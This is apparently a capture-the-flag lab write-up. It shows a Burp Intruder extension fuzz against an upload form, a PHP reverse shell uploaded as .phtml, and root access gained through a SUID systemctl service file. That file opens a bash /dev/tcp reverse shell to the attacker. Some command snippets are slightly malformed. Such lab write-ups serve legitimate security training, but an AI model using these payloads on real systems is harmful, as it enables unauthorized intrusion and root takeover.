#team/red 
**related notes:** [[SUID Exploitation]] **related tools:**[[Burp Suite]]
## Objective

Compromise the web server via unrestricted file upload and escalate privileges using a misconfigured SUID binary.

---

##  Phase 1: Reconnaissance & Fuzzing

The web server has an upload form. We need to identify which file extensions are allowed.

### BurpSuite Intruder Setup

1. **Wordlist**: Create `extensions.txt` with:
    
    - `.php`, `.php3`, `.php4`, `.php5`, `.phtml`
        
2. **Intercept**: Capture an upload request in Burp.
    
3. **Intruder Positions**: Set the attack type to **Sniper** and target the extension:
    
    - `filename="test.§php§"`
        
4. **Results**: Look for the extension that returns a **200 OK** or a different response length (usually `.phtml`).
    

---

## Phase 2: Gaining a Reverse Shell

Once the `.phtml` extension is confirmed as allowed, we upload the payload.

### 1. Prepare Payload

- Download the [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell).
    
- **Edit**: Change `$ip` to your `tun0` IP and `$port` to `1234`.
    
- **Rename**: `mv php-reverse-shell.php shell.phtml`
    

### 2. Catch the Connection

Set up a Netcat listener on your local machine:

Bash

```
nc -lvnp 1234
```

### 3. Execution

1. Upload `shell.phtml` via the web form.
    
2. Navigate to: `http://<MACHINE_IP>:3333/internal/uploads/shell.phtml`
    
3. **Result**: You should now have a shell as `www-data`.
    

---

## Phase 3: Privilege Escalation (SUID)

We need to find a binary with the SUID bit set that allows us to escalate to `root`.

### 1. Find SUID Binaries

Run the following command to find all SUID files:

Bash

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

_Found binary:_ `/usr/bin/systemctl`

### 2. Exploiting Systemctl

Since `systemctl` is SUID, we can create a custom service to run commands as root.

> [!IMPORTANT] **The Payload Strategy** We create a `.service` file that executes a bash command to give us a root shell.

**Create the service file:**

Bash

```
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1"
[Install]
WantedBy=multi-user.target' > /tmp/root.service
```

**Execute the exploit:**

Bash

```
# 1. Start a new listener on your machine: nc -lvnp 9001
# 2. Link and start the service on the target:
systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service
systemctl root
```

---

##  Flags

- **User Flag**: `cat /home/bill/user.txt`
    
- **Root Flag**: `cat /root/root.txt`
    

---

**Notes/Learnings:**

- Always check `.phtml` or `.php5` if `.php` is blocked.
    
- `systemctl` SUID is a powerful entry point—it essentially runs any script as the system owner.